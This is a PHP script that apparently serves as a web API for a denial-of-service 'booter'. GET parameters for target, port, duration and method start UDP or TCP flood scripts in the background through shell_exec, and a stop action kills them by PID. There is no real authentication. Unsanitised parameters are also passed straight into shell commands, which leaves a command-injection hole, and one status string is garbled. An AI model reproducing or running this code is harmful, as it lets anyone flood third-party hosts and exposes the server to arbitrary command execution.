<?php
if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    http_response_code(405);
    echo json_encode(["error" => "Only GET method allowed"]);
    exit;
}

$target = $_GET['target'] ?? null;
$port = $_GET['port'] ?? null;
$time = $_GET['time'] ?? null;
$method = $_GET['method'] ?? null;
$cons = $_GET['cons'] ?? 1;
$key = $_GET['key'] ?? null; // useless, any key accepted
$action = $_GET['action'] ?? 'start';
$id = $_GET['id'] ?? null;

if (!$target || !$port || !$time || !$method) {
    echo json_encode(["error" => "Missing required parameters"]);
    exit;
}

if ($method === "UDP") {
    if ($action === "start") {
        $cmd = "nohup python3 t.py --ip $target --port $port --time $time --times 20 > /dev/null 2>&1 & echo $!";
        $pid = shell_exec($cmd);
        echo json_encode(["status" => "UDP attac20rted", "pid" => trim($pid)]);
    } elseif ($action === "stop") {
        if (!$id) {
            echo json_encode(["error" => "Missing id (PID) to stop"]);
            exit;
        }
        shell_exec("kill $id");
        echo json_encode(["status" => "UDP attack with PID $id stopped"]);
    } else {
        echo json_encode(["error" => "Unknown action"]);
    }

} elseif ($method === "TCP") {
    if ($action === "start") {
        // Call tcpflood launcher with given time (injected into the bash script)
        $cmd = "nohup python3 tcp.py $target $port $time > /dev/null 2>&1 & echo $!";
        $pid = shell_exec($cmd);
        echo json_encode(["status" => "TCP attack started", "pid" => trim($pid)]);
    } elseif ($action === "stop") {
        if (!$id) {
            echo json_encode(["error" => "Missing id (PID) to stop"]);
            exit;
        }
        shell_exec("kill $id");
        echo json_encode(["status" => "TCP attack with PID $id stopped"]);
    } else {
        echo json_encode(["error" => "Unknown action"]);
    }

} else {
    echo json_encode(["error" => "Unsupported method"]);
}
?>
